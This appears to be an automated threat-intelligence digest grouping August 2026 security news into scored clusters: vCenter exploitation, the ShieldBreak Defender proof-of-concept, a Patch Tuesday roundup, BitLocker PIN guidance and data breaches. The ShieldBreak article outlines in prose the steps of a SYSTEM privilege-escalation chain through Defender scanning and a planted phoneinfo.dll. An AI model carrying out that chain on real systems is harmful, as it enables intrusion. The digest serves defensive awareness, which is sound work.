Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Threat Intelligence Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were released by Broadcom late last month. The German cybersecurity company said it discovered the activity following an incident response engagement. The attack chain is said to have exhibited path traversal activity consistent with the flaw, followed by the deployment of a malicious cron job to establish persistence on the host using reverse_ssh, an open-source tool used for setting up SSH connections to threat actor-controlled infrastructure. Compromised systems identified by QUIRSO were found to first establish contact with the attacker's domains on August 3, five days after Broadcom publicly disclosed the flaw. In all, there are as many as 361 unique victim IP addresses located across 47 countries. Most of them are located in Germany, the U.S., Turkey, Iran, and France. "While the attacker might have had prior knowledge of the vulnerability, the strong correlation between the time of disclosure and exploitation suggests the disclosure as the initial starting point for the campaign," QUIRSO added. It's not clear who is behind the exploitation campaign, but it's believed to be the work of a suspected advanced persistent threat (APT) actor. It's worth pointing out that VMware appliances have been a lucrative target for Chinese threat actors like UNC5174 , who have weaponized security flaws impacting VMware Tools and VMware vCenter in various espionage campaigns. In April 2025, SentinelOne disclosed details of a China-nexus threat cluster dubbed PurpleHaze that targeted a South Asian government supporting entity with a Windows backdoor called GoReShell, which uses functionalities from the reverse_ssh tool to establish reverse SSH connections to attacker-controlled hosts. The use of reverse_ssh is notable as it allows the attacker to establish an outbound connection to an endpoint under their control, effectively bypassing security controls designed to prevent suspicious inbound requests. "The presence of reverse_ssh should not, by itself, be treated as proof of malicious activity," QUIRSO noted. "In combination with unauthorized installation, unexpected outbound connections or execution on a vulnerable vCenter appliance, however, it is a high-priority indicator requiring investigation." The disclosure comes as Defused Cyber said it's observing a spike in scanning against VMware vCenter that is indicative of potential exploitation efforts targeting CVE-2026-59309 (CVSS score: 9.8). "Our honeypots are logging increased fingerprinting – such as version probes via POST /sdk/ (RetrieveServiceContent) and walks of the /websso SAML SSO flow – coinciding with Broadcom's VMSA-2026-0006 (CVE-2026-59309, unauth auth-bypass in vmdir, CVSS 9.8)," the cybersecurity company said. Denis Szadkowski, COO and co-founder of QUIRSO GmbH, told The Hacker News that there is not enough evidence at this stage to correlate exploitation and scanning efforts using CVE-2026-59309 with the intrusion set or the attacker infrastructure associated with CVE-2026-59310. "What we can say with much higher confidence is that the activity we investigated represents a successful compromise rather than merely exploitation attempts, and the forensic evidence strongly points toward CVE-2026-59310 as the initial access vector," Szadkowski added. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  APT , enterprise securit
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access
  - Published: 2026-08-12T09:01:54+00:00
  - Link: https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
  - Summary: Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Global Threat Campaign Hits Critical VMware vCenter Flaw
  - Published: 2026-08-13T20:45:17+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw
  - Summary: Exploitation against CVE-2026–59310 began earlier this month, and patching the vulnerability may not be enough to fully mitigate the threat.

### Cluster 8fb5179107 — score 10

- Title: ShieldBreak Zero-Day PoC Claims Microsoft Defender Patch Bypass With SYSTEM Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T06:41:38+00:00
- Link: https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-50656, Microsoft Defender

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure, zero_day
- affected_products: Microsoft Defender, Microsoft Windows
- cve_ids: CVE-2026-50656
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure
- affected_products: Microsoft Defender, Microsoft Windows
- cve_ids: CVE-2026-50656
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The security researcher going by the name Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has released a proof-of-concept (PoC) for a new Microsoft zero-day called ShieldBreak. The vulnerability, rooted in Microsoft Defender for Windows, demonstrates a patch bypass for CVE-2026-50656 (CVSS score: 7.8), otherwise known as RoguePlanet. RoguePlanet has been described
```

#### Full body

```
ShieldBreak Zero-Day PoC Claims Microsoft Defender Patch Bypass With SYSTEM Access  Ravie Lakshmanan  Aug 12, 2026 Zero-Day / Vulnerability The security researcher going by the name Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has released a proof-of-concept (PoC) for a new Microsoft zero-day called ShieldBreak . The vulnerability, rooted in Microsoft Defender for Windows, demonstrates a patch bypass for CVE-2026-50656 (CVSS score: 7.8), otherwise known as RoguePlanet . RoguePlanet has been described as a race condition that, if successfully exploited, could grant an attacker the ability to spawn a shell with SYSTEM-level privileges, enabling them to run arbitrary code or perform unauthorized actions. Although it was first disclosed by the researcher in June 2026, a patch for the vulnerability was not released by Microsoft until almost a month later. The tech giant described it as a privilege escalation issue in the Microsoft Malware Protection Engine ("mpengine.dll"). Soon after, Chaotic Eclipse said the "defense-in-depth updates" introduced by Microsoft to address CVE-2026-50656 can cause Defender to leak 8 bytes of data when attempting to open a file in certain scenarios on Windows 11 25H2 and Windows Server 2025. Microsoft told The Hacker News at the time that it's aware of the report and is investigating. ShieldBreak, on the other hand, is assessed to be a full patch bypass for CVE-2026-50656, with the researcher claiming that "Microsoft has failed to properly patch the RoguePlanet vulnerability." "The PoC was tested in the latest version of Windows 11 25h2 (+Canary channel) and Windows Server 2025, the PoC also have a 100% success rate," the researcher added. "Please note that Windows 10 (and respective server editions) are not currently supported, they are however vulnerable to ShieldBreak as well." When contacted for comment, a Microsoft spokesperson shared the following statement with The Hacker News - Microsoft is aware of the reported vulnerability and is actively investigating the validity and potential applicability of these claims. Microsoft is committed to investigating security issues and updating impacted products to protect customers as soon as possible. Importantly, we support coordinated vulnerability disclosure, an industry standard that protects customers and supports the research community by ensuring their findings are thoroughly investigated and addressed before being made public. Security researcher Kevin Beaumont, in a post on Mastodon, confirmed the exploit works on Windows 11, adding that the two exploits work differently. "RoguePlanet was a filesystem race condition vuln that uses virtual disks and NT native file manipulation to trick quarantine process into overwriting system files," Beaumont noted . "ShieldBreak user-mode callback hook to change file contents during a Defender cloud-hydration scan via cfapi (Cloud Filter API)." Will Dormann, principal vulnerability analyst at Tharros, also validated ShieldBreak, stating Defender needs to be enabled for the exploit to work and that "my naive eyeballs fail to see the similarity" with RoguePlanet. Dormann explained the sequence of actions as follows - Plant an EICAR file Use Object Manager symlinks to control Defender's scan path to system32. During the scan, leverage CLFS to swap the identity file and hydration data to C:\Windows\system32\phoneinfo.dll (which doesn't exist by default in Windows) Run the QueueReporting scheduled task, which runs wermgr.exe -upload as Run with highest privileges "In the wer.dll code, there is explicit code to load phoneinfo.dll," the researcher said . "Because at this point, phoneinfo.dll exists and is our own code, this runs, spawning conhost.exe with SYSTEM privileges. I don't recall RoguePlanet doing anything with cloud providers, CLFS, hydration anything, phoneinfo.dll, and unlike RoguePlanet, ShieldBreak seems to require Defender to be active to work." The development comes as
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ShieldBreak Zero-Day PoC Claims Microsoft Defender Patch Bypass With SYSTEM Access
  - Published: 2026-08-12T06:41:38+00:00
  - Link: https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html
  - Summary: The security researcher going by the name Chaotic Eclipse (aka INFINITE NIGHTMARE, MSNightmare, and Nightmare-Eclipse) has released a proof-of-concept (PoC) for a new Microsoft zero-day called ShieldBreak. The vulnerability, rooted in Microsoft Defender for Windows, demonstrates a patch bypass for CVE-2026-50656 (CVSS score: 7.8), otherwise known as RoguePlanet. RoguePlanet has been described

### Cluster 7f18333ab6 — score 10

- Title: Microsoft Patches 398 Flaws Including a Windows Driver Zero-Day Under Active Attack
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-11T20:10:55+00:00
- Link: https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html
- Fetch status: ok
- Member count: 4
- Corroborating source count: 2
- Strong signals: CVE-2026-68820, Microsoft Windows

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor, zero_day
- actor_attribution: Lazarus, Mustang Panda
- affected_industries: education
- affected_products: Microsoft SharePoint, Microsoft Windows
- cve_ids: CVE-2026-59124, CVE-2026-62815, CVE-2026-62878, CVE-2026-62893, CVE-2026-68820
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- actor_attribution: Lazarus
- affected_products: Microsoft Windows, Microsoft SharePoint
- cve_ids: CVE-2026-68820, CVE-2026-62878, CVE-2026-62893, CVE-2026-62815, CVE-2026-59124
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft released its monthly security updates on Tuesday, and one of the flaws it closed is already being used in attacks. The bug sits in a core Windows kernel driver that handles network socket operations. An attacker with code already running on a machine can use it to escalate to SYSTEM. That patch goes out first. The flaw is tracked as CVE-2026-68820 (CVSS score: 7.0) and is the only
```

#### Full body

```
Microsoft Patches 398 Flaws Including a Windows Driver Zero-Day Under Active Attack  Swati Khandelwal  Aug 11, 2026 Vulnerability / Windows Security Microsoft released its monthly security updates on Tuesday, and one of the flaws it closed is already being used in attacks. The bug sits in a core Windows kernel driver that handles network socket operations. An attacker with code already running on a machine can use it to escalate to SYSTEM. That patch goes out first. The flaw is tracked as CVE-2026-68820 (CVSS score: 7.0) and is the only one in this month's release Microsoft flags as under active exploitation. Exploitation depends on triggering a race condition in the driver. Microsoft has not publicly attributed the exploitation. Check Point Research says Lazarus used the zero-day in its Operation Dream Job campaign. Four other flaws in the release need nothing at all from the victim: no account, no password, no click. They affect Windows DNS Server, Windows Deployment Services, Microsoft's implementation of the QUIC transport protocol, and High Performance Computing (HPC) Pack, and each carries a CVSS score of 9.8. None was flagged as exploited when the updates shipped. Counting independently, the Zero Day Initiative puts the release at 398 new CVEs, 62 of them rated Critical. The count shows the size of the release; exploit status and reach decide the patch order. The release also closes the RCE half of a SharePoint chain whose authentication bypass was fixed in July. On-premises SharePoint farms should have both updates installed. Check Point Research said CVE-2026-68820 is a use-after-free in afd.sys, the Ancillary Function Driver for WinSock and a kernel-side component of Windows networking. The bug is privilege escalation: an attacker needs code running on the machine first, then can use it to reach SYSTEM. Microsoft flags it as actively exploited, which puts it ahead of the four 9.8 server RCEs here despite the lower score. Nothing required from the victim The four unauthenticated remote code execution flaws are the ones to queue behind the exploited driver bug because they can give an attacker code on a server without first needing an account or a user action. CVE-2026-62878, Windows DNS Server. A stack-based buffer overflow reachable remotely with no authentication and no user interaction. The Zero Day Initiative describes the condition as wormable despite Microsoft rating exploitation as less likely. ZDI's “wormable” label describes the technical condition; it does not establish that a worm exists. CVE-2026-62893, Windows Deployment Services. A remote flaw reachable through the service's TFTP handling without authentication or user interaction. CVE-2026-62815, Microsoft QUIC. A remote, unauthenticated code execution flaw requiring no user interaction. CVE-2026-59124, HPC Pack. It carries the same 9.8 score but is rated Important rather than Critical because HPC Pack is not installed by default. Microsoft rates exploitation as more likely. HPC Pack is not installed by default, and the practical priority of the other three likewise depends on whether the vulnerable service is present and reachable in a given environment. So service inventory and reachability matter alongside exploit status when setting patch priority. A SharePoint chain closes August also completes a two-part SharePoint fix that started in July. Rapid7 Labs reported an exploit chain to Microsoft on May 18 that combined an authentication bypass with a separate code execution vulnerability to reach unauthenticated RCE against on-premises SharePoint . Microsoft confirmed two days later that it planned to split the remediation across the July and August update cycles. July fixed the first half, CVE-2026-55040 , a Critical authentication bypass scored at 9.1. Rapid7 found that the flaw lets a remote unauthenticated attacker assume the identity of a SharePoint site user or administrator if the attacker knows the identity to impersonate. August supplies the
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Patches 398 Flaws Including a Windows Driver Zero-Day Under Active Attack
  - Published: 2026-08-11T20:10:55+00:00
  - Link: https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html
  - Summary: Microsoft released its monthly security updates on Tuesday, and one of the flaws it closed is already being used in attacks. The bug sits in a core Windows kernel driver that handles network socket operations. An attacker with code already running on a machine can use it to escalate to SYSTEM. That patch goes out first. The flaw is tracked as CVE-2026-68820 (CVSS score: 7.0) and is the only
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Windows 11’s strongest security defenses can be bypassed without a screwdriver
  - Published: 2026-08-17T05:30:34+00:00
  - Link: https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/
  - Summary: Researchers from the University of Birmingham and Durham University have found a way to knock down some of the toughest protections in Windows 11 without physically opening or modifying the target machine. The attack assumes the attacker has already gained privileged access to the system. A chip that never checks who’s asking The attack, named “Download More RAM,” targets a small configuration chip found on Dual In-line Memory Modules (DIMMs), the RAM sticks inside most … More → The post Windows 11’s strongest security defenses can be bypassed without a screwdriver appeared first on Help Net Security .

### Cluster c63d21cf7f — score 9

- Title: How BitLocker PINs help protect your data and devices
- Source: NCSC UK (government_authoritative)
- Published: 2026-08-13T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/blogs/how-bitlocker-pins-help-protect-your-data-and-devices
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Microsoft BitLocker

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: Microsoft BitLocker
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_products: Microsoft BitLocker
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Using a PIN mitigates many BitLocker vulnerabilities. Make sure you’re ready for the next one...
```

#### Full body

```
Blog Post Download & print article PDF Download & print article PDF How BitLocker PINs help protect your data and devices Using a PIN mitigates many BitLocker vulnerabilities. Make sure you’re ready for the next one... Josh D Design Pics/Darren Greenwood via Getty Images The NCSC provides guidance on how to securely configure Microsoft Windows . This includes setting up BitLocker, which encrypts your device to protect the data and the operating system from tampering. Our guidance recommends that BitLocker be configured to require a PIN before decrypting your device. However, many organisations use BitLocker without a PIN, leaving their devices vulnerable. In this blog we explain why a PIN is so important, and what to do if – for whatever reason – you can’t use a PIN. Breaking BitLocker: vulnerabilities and WinRE BitLocker has been under increased public scrutiny in recent months, as vulnerabilities like YellowKey made headlines . By using the Windows Recovery Environment (WinRE), YellowKey was able to bypass certain BitLocker configurations, potentially decrypting drives that should have been protected. Whilst this issue was quickly patched, the severity of this finding left many concerned about the security of BitLocker. What is often missed in discussions around YellowKey is that it is not a new type of vulnerability; bugs in WinRE have been used to bypass BitLocker for years. Preventing these sorts of attacks is one of the reasons why NCSC guidance has always encouraged using a BitLocker PIN. And despite the hyperbolic descriptions of YellowKey’s author likening it to a backdoor, Microsoft have been very public about this. In 2025, Microsoft found and patched four very similar bugs, presenting them at the security conference BlackHat along with a blog explaining how these vulnerabilities work and how to protect against them . If I were trying to hide something, that’s certainly not how I’d start. The NCSC guidance recommends configuring BitLocker to require a PIN, which mitigates the YellowKey vulnerability. The underlying question though, is why do attacks like this keep happening? If WinRE is such a threat to BitLocker, why hasn’t it been fixed? The answer is that this problem is as much about conflicting design principles as it is about individual bugs. WinRE exists to ensure that you can retrieve your data even if something goes wrong. To do this, BitLocker deliberately does not encrypt the files associated with WinRE (because an issue with BitLocker might be the reason you need to recover data). This absence of encryption leaves a gap that can be used by exploits such as YellowKey, and as long as that design decision remains in place, vulnerabilities like YellowKey will continue to be found. This is why configuring BitLocker to require a PIN is so crucial. Requiring a user to authenticate before using WinRE helps to protect an element of Windows that is uniquely exploitable. In this respect, using BitLocker without a PIN will always be a half measure; it is only a matter of time before new vulnerabilities are discovered in an operating system as large as Windows. YellowKey was not the first time WinRE was used to bypass BitLocker, and it will not be the last. What if I can’t use a PIN? The NCSC appreciate that there will be cases where using a PIN is not practical. For example: where multiple users access the same device (such as in a ‘hot desking’ office) where a device is used in time-critical emergencies, so the extra seconds in takes to type in a PIN cannot be spared where a device needs to boot without human interaction (such as in a dangerous environment) Whatever the reason, if you can’t manually enter a BitLocker PIN in your deployment, some of the risk can be mitigated using a number of techniques: Use the same PIN If the only barrier is that users can’t remember a PIN, consider using the same PIN for Windows Hello and BitLocker. This isn’t practical for shared devices with multiple users, but otherwise it pro
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: How BitLocker PINs help protect your data and devices
  - Published: 2026-08-13T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/blogs/how-bitlocker-pins-help-protect-your-data-and-devices
  - Summary: Using a PIN mitigates many BitLocker vulnerabilities. Make sure you’re ready for the next one...

### Cluster afcea3ecd9 — score 9

- Title: Wireshark 4.6.8 Released, (Sun, Aug 16th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-08-16T21:31:48+00:00
- Link: https://isc.sans.edu/diary/rss/33248
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Wireshark 4.6.8 Released, (Sun, Aug 16th)
  - Published: 2026-08-16T21:31:48+00:00
  - Link: https://isc.sans.edu/diary/rss/33248
  - Summary: Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.

### Cluster 11f4a7bd3c — score 9

- Title: Using Gemma4 with Ollama - Testing File Hash Analysis and Recommendations with AI, (Wed, Aug 12th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-08-13T01:26:53+00:00
- Link: https://isc.sans.edu/diary/rss/33242
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
In the past few weeks, I have been using Gemma4 as a Large Language Model (LLM) to see how useful it can be to analyze some of the malware hashes uploaded to the DShield sensor over the past 30 days and figure out how its recommendation can be considered useful about the activity my DShield sensor is collecting and tracking. The model I use for this testing is gemma4:e4b [ 2 ] using two sites to compare the data against VirusTotal and CyberGordon .
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Using Gemma4 with Ollama - Testing File Hash Analysis and Recommendations with AI, (Wed, Aug 12th)
  - Published: 2026-08-13T01:26:53+00:00
  - Link: https://isc.sans.edu/diary/rss/33242
  - Summary: In the past few weeks, I have been using Gemma4 as a Large Language Model (LLM) to see how useful it can be to analyze some of the malware hashes uploaded to the DShield sensor over the past 30 days and figure out how its recommendation can be considered useful about the activity my DShield sensor is collecting and tracking. The model I use for this testing is gemma4:e4b [ 2 ] using two sites to compare the data against VirusTotal and CyberGordon .

### Cluster 5b5ad8b9f8 — score 9

- Title: French tax authority data breach affects 678,000 individuals
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-17T10:09:48+00:00
- Link: https://www.bleepingcomputer.com/news/security/french-tax-authority-data-breach-affects-678-000-individuals/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: financial_services, government
- affected_products: Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: financial_services, government
- affected_products: Snowflake
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. [...]
```

#### Full body

```
French tax authority data breach affects 678,000 individuals By Sergiu Gatlan August 17, 2026 06:09 AM 0 The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. This incident was discovered after a threat actor using the "ZeroBytes" handle claimed the attack and listed a stolen database for sale on August 12 on the PwnForums hacking forum. "The in-depth investigations conducted since August 12, 2026, have established that, prior to their interruption, these access points had been used to consult and extract data concerning a total of 678,000 individuals and professionals, including tax data such as reference tax income, family quotient, and withholding tax rate, and, for businesses, data such as their company name and SIREN number," the French Finance Ministry said . "Cadastral data relating to addresses and property sizes were also accessed. As soon as these data breaches were identified, the French Public Finances Directorate (DGFIP) notified the French Data Protection Authority (CNIL). The online accounts of individual and professional users were not compromised. User IDs and passwords were not compromised." After detecting the attack, the French tax administration shut down access to sensitive information systems and continues investigating the incident with the help of the National Cybersecurity Agency of France (ANSSI) to assess the breach's full impact. In a post on the hacking forum, ZeroBytes also claimed they gained access to the Serveur Professionnel de Données Cadastrales (SPDC), an online platform operated by the French tax authority that provides access to the country's central land registry and property ownership records. French DGFiP database for sale ( DarkWebSonar ) ​While the portal gave them access to data on roughly 20 million French citizens, the threat actor claims they only managed to steal 252,149 records containing data on over 2 million people. "We couldn't finish the extraction because honestly, it's just horrible to scrape and would have taken months. I'm still logged into the panel, so if you want, you can buy it along with the database," they said. "I'm not going to sell this one for very much anyway. And as always, no mention from France about this incident." The French Finance Ministry added on Friday that it will contact all affected individuals starting next week via email or letter, with details on what data may have been accessed or stolen and the necessary precautions to take. This is just the latest in a spree of cyberattacks and data breaches that have impacted multiple French government agencies in recent months. In January, the French data protection authority fined the national employment agency France Travail €5 million after hackers stole the personal information of 43 million people. One month later, the French Ministry of Finance disclosed another data breach affecting over 1.2 million user accounts after hackers stole a database from the national bank account registry (FICOBA) systems. More recently, France Titres, the government agency in France for issuing and managing administrative documents, also disclosed a data breach after a threat actor put up for sale a database containing 19 million records allegedly stolen from the National Agency for Secure Documents (ANTS). Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: France fines unemployment agency €5 million over data breach Valve notifies Steam hardware customers of a data breach Canadian pleads guilty to Snowflake cloud data-theft attacks Huggi
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: French tax authority data breach affects 678,000 individuals
  - Published: 2026-08-17T10:09:48+00:00
  - Link: https://www.bleepingcomputer.com/news/security/french-tax-authority-data-breach-affects-678-000-individuals/
  - Summary: The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. [...]

### Cluster ff9d8c251f — score 9

- Title: 680,000 Impacted by French Tax Authority Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-08-17T13:53:55+00:00
- Link: https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- affected_industries: financial_services, government
- affected_products: Apple iOS/macOS, Fortinet, VMware
- urgency_signals: no_patch_yet, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- affected_industries: financial_services, government
- affected_products: Fortinet, Apple iOS/macOS, VMware
- urgency_signals: zero_day, no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers used compromised credentials to access enterprise and personal tax-related data. The post 680,000 Impacted by French Tax Authority Data Breach appeared first on SecurityWeek .
```

#### Full body

```
France’s Directorate General of Public Finances (DGFiP) has disclosed a data breach impacting approximately 680,000 individuals. The incident was disclosed after a threat actor boasted on a hacking forum about accessing DGFiP’s internal systems and exfiltrating data. According to DGFiP, the threat actor accessed its systems in June and July, and the unauthorized access was suspended immediately upon detection. However, the public tax authority did not discover evidence of data exfiltration at the time. Last week, DGFiP confirmed that the attackers used compromised credentials for an employee and a third-party account to access its systems and steal the information of 678,000 users. According to the finance agency, reference tax income, withholding tax rate, company names and unique identifiers, and cadastral data on real estate addresses and surfaces were compromised. No other information, including usernames and passwords, was compromised in the attack, which was immediately reported to France’s data protection authority CNIL. Advertisement. Scroll to continue reading. DGFiP says it continues to investigate the nature and scope of the data breach, as well as the exact number of potentially affected individuals. The tax authority says it will contact each affected individual directly. The incident came to light roughly one month after another European government agency, Romania’s National Agency for Cadastre and Property Registration (ANCPI), fell victim to a disruptive cyberattack. ANCPI was reportedly hacked by a threat actor known as ByteToBreach, who stole information including employee credentials and internal documents and attempted to extort the agency. When the extortion attempt failed, the hacker reportedly wiped the encrypted data, disrupting official applications, sites, and email services, and bringing Romania’s real estate market to a standstill. The central database of the cadastral system, containing property and real estate rights records, was not affected. Still, ANCPI scrambled for roughly three weeks to rebuild its servers and restore the affected applications. Related: 40,000 Impacted by SafePal Data Breach Related: Fortune 500 Companies Hit in Azure Data Theft Campaign Related: Trivy, Not LiteLLM Behind the 2,500 Org Compromise Related: Irregular Details How a Naming Error Let AI Models Attack a Real Company Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Latest News Irregular Details How a Naming Error Let AI Models Attack a Real Company Conflicting Test Goals Pushed Claude Agents to Deploy Self-Replicating Malware 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure Fortune 500 Companies Hit in Azure Data Theft Campaign In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Trivy, Not LiteLLM Behind the 2,500 Org Compromise Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Rethinking Cyber Defense for AI-Speed Attacks August 18, 2026 Join this live webinar as we explore if detection-first security operations can keep pace wi
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 680,000 Impacted by French Tax Authority Data Breach
  - Published: 2026-08-17T13:53:55+00:00
  - Link: https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/
  - Summary: Hackers used compromised credentials to access enterprise and personal tax-related data. The post 680,000 Impacted by French Tax Authority Data Breach appeared first on SecurityWeek .

### Cluster 1ac2c2cb37 — score 9

- Title: 40,000 Impacted by SafePal Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-08-17T09:37:06+00:00
- Link: https://www.securityweek.com/40000-impacted-by-safepal-data-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, zero_day
- affected_industries: financial_services, government
- affected_products: Apple iOS/macOS, Fortinet, VMware
- urgency_signals: no_patch_yet, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, data_breach
- affected_industries: financial_services, government
- affected_products: Fortinet, Apple iOS/macOS, VMware
- urgency_signals: zero_day, no_patch_yet
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers exploited a vulnerability in the order-tracking function of a plugin to access SafePal customer information. The post 40,000 Impacted by SafePal Data Breach appeared first on SecurityWeek .
```

#### Full body

```
Crypto hardware wallet SafePal is notifying roughly 40,000 individuals that their personal information was stolen in a data breach. Hackers, it says, exploited a vulnerability in the order-tracking function of a customer order information plugin to gain access to customer information. “We are extremely sorry to inform the community that order information for customers who placed orders between March 2, 2025, and April 11, 2026,” SafePal says . The compromised information includes names, addresses, email addresses, phone numbers, and order details. “The affected data involves approximately 39,798 customers,” the crypto wallet says. SafePal disclosed the data breach on Sunday, the same day that a threat actor started advertising on a cybercrime forum the theft of SafePal data. In line with SafePal’s disclosure, the attacker claims 39,798 people were affected. Advertisement. Scroll to continue reading. The company underlines that no other customer-related information was affected. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” it says. Potentially affected individuals are advised to be wary of suspicious communication requesting their seed phrases or private keys. “If you have already shared or entered your seed phrase or private key in response to a suspicious message, website, phone call, or letter, treat that wallet as compromised. Create a new wallet using a trusted SafePal device or official SafePal 